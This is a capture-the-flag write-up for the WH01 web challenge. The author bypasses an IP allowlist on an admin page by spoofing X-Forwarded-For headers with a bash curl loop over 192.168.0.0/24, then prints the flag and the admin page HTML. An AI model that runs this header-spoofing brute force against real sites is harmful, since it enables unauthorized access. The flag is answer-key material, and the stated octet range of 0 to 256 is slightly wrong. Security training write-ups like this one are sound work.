# WH01
> 500pts

## Briefing
> Access the site at https://cfta-wh01.allyourbases.co and find a way to get the flag from the CMS.

## Solution
First, scan for directories. I used [dirsearch](https://github.com/maurosoria/dirsearch), which uncovered two interesting pages:
* `admin.html` (0 bytes)
* `readme.txt`

### Figuring out what to do
If you visit [readme.txt](https://cfta-wh01.allyourbases.co/readme.txt), you get this message:
```
To use the CMS make sure to visit /admin.html from allowed IPs on the local network.

Note: Tell engineering to stop moving the subnet from 192.168.0.0/24
```

We can infer two things:
1. Only *certain* IPs on the local network can access /admin.html
2. The local network subnet is `192.168.0.0/24`

From this, we can determine that in order to access `/admin.html`, we need to **spoof with an IP in the range of `192.168.0.0/24` (ex: 192.168.0.3; the last digit can be any number from 0 to 256)**.

#### To spoof the IP, all we have to do is send an `X-Forwarded-For` header in our request.

### Exploiting
I wrote a trusty bash script to do the job:

```sh
for i in {0..256}
do
  echo "IP: 192.168.0.$i"
  curl -i -H "X-Forwarded-For: 192.168.0.$i" https://cfta-wh01.allyourbases.co/admin.html
done
```
> **Note:** This really isn't the most efficient way, and I just used `grep` after to find the successful IP, which was **192.168.0.62**

Success! We're on the admin page and we've got the flag.
```html
<!DOCTYPE html>

<html lang="en">
<head>
    <title>My Blog</title>
    <link rel="stylesheet" href="mysite.css">
</head>
<body>
<div class="main">
    <div class="center">
        <div class="header">
            <h1>Admin</h1>
        </div>
        <div class="content flag">
            <h2>Flag</h2>
            iPSpooFinGWiThHopHeaDers91918
        </div>
        <div class="footer">
            Powered By: mycustomcms 2021
        </div>
    </div>
</div>
</body>
</html>
```

## Flag
Flag: `iPSpooFinGWiThHopHeaDers91918`
